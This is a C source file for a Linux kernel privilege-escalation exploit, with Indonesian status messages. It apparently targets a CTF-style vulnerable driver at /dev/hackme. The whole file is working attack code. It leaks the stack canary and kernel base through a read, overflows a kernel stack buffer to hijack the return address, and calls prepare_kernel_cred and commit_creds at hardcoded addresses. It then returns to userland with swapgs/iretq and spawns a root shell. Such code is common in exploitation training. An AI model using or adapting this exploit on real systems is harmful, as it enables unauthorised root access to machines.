#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>

unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long canary, kernel_base;
unsigned long prepare_kernel_cred, commit_creds;
int global_fd;

void save_state()
{
	__asm__ volatile(
	 ".intel_syntax noprefix;"
	 "mov user_cs, cs;"
	 "mov user_ss, ss;"
	 "mov user_sp, rsp;"
	 "pushf;"
	 "pop user_rflags;"
	 ".att_syntax;"
	);
	printf("menyimpan status userland\n");
}

void leak()
{
	int size=50;
	unsigned long buff[size];

	read(global_fd,buff,sizeof(buff));
	/*for(int i=0;i<size;i++){
		printf("[%d]: %lx\n" ,i,buff[i]);
	}*/

	canary = buff[16];
	kernel_base = buff[38] - 0xa157;

	printf("canary: %lx\n" ,canary);
	printf("kernel base: %lx\n" ,kernel_base);
}

void open_device()
{
	global_fd = open("/dev/hackme",O_RDWR);
	if(global_fd==-1){
		perror("open hackme ");
		exit(EXIT_FAILURE);
	}else{
		puts("perangkat terbuka");
	}
}

void get_shell()
{
	if(getuid()==0){
		printf("Anda root\n");
		system("/bin/sh");
	}else{
		printf("gagal mendapatkan root\n");
	}
}
unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs()
{

	__asm__ volatile(
	 ".intel_syntax noprefix;"
	 "movabs rax, 0xffffffff814c67f0;"
	 "xor rdi, rdi;"
	 "call rax;"
	 "mov rdi, rax;"
	 "movabs rax, 0xffffffff814c6410;"
	 "call rax;"
	 "swapgs;"
	 "mov r15, user_ss;"
	 "push r15;"
	 "mov r15, user_sp;"
	 "push r15;"
	 "mov r15, user_rflags;"
	 "push r15;"
	 "mov r15, user_rip;"
	 "push r15;"
	 "iretq;"
	 ".att_syntax;"
	);
}

void overflow()
{
	printf("overflow\n");
	int size = 50;
	unsigned long buff[size];
	unsigned off = 16;
	buff[off++] = canary;
	buff[off++] = 0x0; //rbx
	buff[off++] = 0x0; //r12
	buff[off++] = 0x0; //rbp
	buff[off++] = (unsigned long)escalate_privs; //ret
	write(global_fd,buff,sizeof(buff));
}
int main()
{
	save_state();
	open_device();
	leak();
	overflow();

	return EXIT_SUCCESS;
}
